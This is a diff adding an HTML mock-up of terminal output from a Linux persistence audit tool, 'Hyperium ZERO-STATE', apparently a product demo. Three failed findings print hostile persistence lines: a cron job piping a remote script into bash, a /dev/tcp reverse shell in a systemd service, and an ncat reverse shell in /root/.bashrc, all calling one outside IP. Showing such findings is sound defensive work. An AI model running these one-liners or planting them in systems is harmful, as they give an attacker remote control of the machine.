@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<title>Hyperium ZERO-STATE - Persistence Detail</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&display=swap" rel="stylesheet">
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body { background: #0a0a0a; min-height: 100vh; display: flex; align-items: flex-start; justify-content: center; padding: 40px 20px; }
+  .frame { width: 900px; background: #1a1a1a; border-radius: 16px; overflow: hidden; box-shadow: 0 40px 100px rgba(0,0,0,0.8), 0 0 0 1px rgba(255,255,255,0.05); }
+  .titlebar { background: #252525; padding: 14px 20px; display: flex; align-items: center; gap: 8px; }
+  .dot { width: 12px; height: 12px; border-radius: 50%; }
+  .dot.r { background: #ff5f57; } .dot.y { background: #febc2e; } .dot.g { background: #28c840; }
+  .titlebar span { color: #666; font-family: 'JetBrains Mono', monospace; font-size: 13px; margin-left: 12px; }
+  .terminal { padding: 24px 28px; font-family: 'JetBrains Mono', monospace; font-size: 13px; line-height: 1.65; color: #c8c8c8; background: #0d0d0d; }
+  .prompt { color: #28c840; } .cmd { color: #e8e8e8; font-weight: 500; } .flag { color: #5bc0de; }
+  .label { color: #888; } .value { color: #f0f0f0; } .accent { color: #e8c547; font-weight: 700; }
+  .sep { color: #333; letter-spacing: 1px; }
+  .critical { color: #ff4444; font-weight: 700; } .high { color: #f0ad4e; } .medium { color: #5bc0de; }
+  .ok { color: #28c840; } .dim { color: #555; } .info { color: #5bc0de; }
+  .section-title { color: #e8c547; font-weight: 700; font-size: 13px; margin-top: 4px; }
+  .check-ok { color: #28c840; }
+  .check-fail { color: #ff4444; }
+  .spacer { height: 3px; }
+  .finding-block { border-left: 2px solid #ff4444; padding-left: 12px; margin: 4px 0; }
+</style>
+</head>
+<body>
+<div class="frame">
+  <div class="titlebar">
+    <div class="dot r"></div><div class="dot y"></div><div class="dot g"></div>
+    <span>root@dc-01:~/zero-state</span>
+  </div>
+  <div class="terminal">
+    <div><span class="prompt">root@dc-01</span>:<span class="prompt">~/zero-state</span>$ <span class="cmd">./zero-state</span> <span class="flag">persistence</span></div>
+    <div class="spacer"></div>
+    <div class="spacer"></div>
+    <div><span class="accent">  Hyperium ZERO-STATE</span> <span class="dim">-- Persistence Audit Module</span></div>
+    <div><span class="sep">  ----------------------------------------------------------</span></div>
+    <div class="spacer"></div>
+    <div class="spacer"></div>
+    <div><span class="dim">  [1/8]</span> <span class="label">LIN-PERSIST-001</span> <span class="info">User Crontab</span></div>
+    <div><span class="check-ok">      PASSED</span> <span class="dim">-- No suspicious entries in user crontabs</span></div>
+    <div class="spacer"></div>
+    <div><span class="dim">  [2/8]</span> <span class="label">LIN-PERSIST-002</span> <span class="info">System Cron</span></div>
+    <div class="finding-block">
+    <div><span class="check-fail">      FAILED</span> <span class="critical">-- CRITICAL</span></div>
+    <div><span class="dim">      File:</span> <span class="value">/etc/cron.d/.backdoor</span></div>
+    <div><span class="dim">      Content:</span> <span class="high">*/5 * * * * root curl -s http://185.220.101.34/payload.sh | bash</span></div>
+    </div>
+    <div class="spacer"></div>
+    <div><span class="dim">  [3/8]</span> <span class="label">LIN-PERSIST-003</span> <span class="info">Systemd Services</span></div>
+    <div class="finding-block">
+    <div><span class="check-fail">      FAILED</span> <span class="critical">-- CRITICAL</span></div>
+    <div><span class="dim">      Service:</span> <span class="value">system-networkd.service</span></div>
+    <div><span class="dim">      ExecStart:</span> <span class="high">/dev/shm/.systemd-helper -c 'bash -i >& /dev/tcp/185.220.101.34/4444 0>&1'</span></div>
+    <div><span class="dim">      Status:</span> <span class="critical">active (running)</span></div>
+    </div>
+    <div class="spacer"></div>
+    <div><span class="dim">  [4/8]</span> <span class="label">LIN-PERSIST-004</span> <span class="info">RC Local</span></div>
+    <div><span class="check-ok">      PASSED</span> <span class="dim">-- /etc/rc.local not found or empty</span></div>
+    <div class="spacer"></div>
+    <div><span class="dim">  [5/8]</span> <span class="label">LIN-PERSIST-005</span> <span class="info">Bash Profile</span></div>
+    <div class="finding-block">
+    <div><span class="check-fail">      FAILED</span> <span class="high">-- HIGH</span></div>
+    <div><span class="dim">      File:</span> <span class="value">/root/.bashrc</span></div>
+    <div><span class="dim">      Content:</span> <span class="high">ncat -e /bin/bash 185.220.101.34 5555 &amp;</span></div>
+    </div>
+    <div class="spacer"></div>
+    <div><span class="dim">  [6/8]</span> <span class="label">LIN-PERSIST-006</span> <span class="info">SSH Authorized Keys</span></div>
+    <div><span class="check-ok">      PASSED</span> <span class="dim">-- 2 keys found, all belonging to known administrators</span></div>
+    <div class="spacer"></div>
+    <div><span class="dim">  [7/8]</span> <span class="label">LIN-PERSIST-007</span> <span class="info">LD_PRELOAD</span></div>
+    <div><span class="check-ok">      PASSED</span> <span class="dim">-- /etc/ld.so.preload not found or empty</span></div>
+    <div class="spacer"></div>
+    <div><span class="dim">  [8/8]</span> <span class="label">LIN-PERSIST-008</span> <span class="info">Init Scripts</span></div>
+    <div><span class="check-ok">      PASSED</span> <span class="dim">-- No suspicious init scripts detected</span></div>
+    <div class="spacer"></div>
+    <div class="spacer"></div>
+    <div><span class="sep">  ============================================================</span></div>
+    <div class="spacer"></div>
+    <div><span class="dim">  Checks:</span>     <span class="value">8/8 completed</span></div>
+    <div><span class="dim">  Passed:</span>     <span class="ok">5</span></div>
+    <div><span class="dim">  Failed:</span>     <span class="critical">3</span></div>
+    <div><span class="dim">  Critical:</span>   <span class="critical">2</span></div>
+    <div><span class="dim">  High:</span>       <span class="high">1</span></div>
+    <div><span class="dim">  Duration:</span>   <span class="value">1.2s</span></div>
+    <div class="spacer"></div>
+    <div><span class="sep">  ============================================================</span></div>
+  </div>
+</div>
+</body>
+</html>
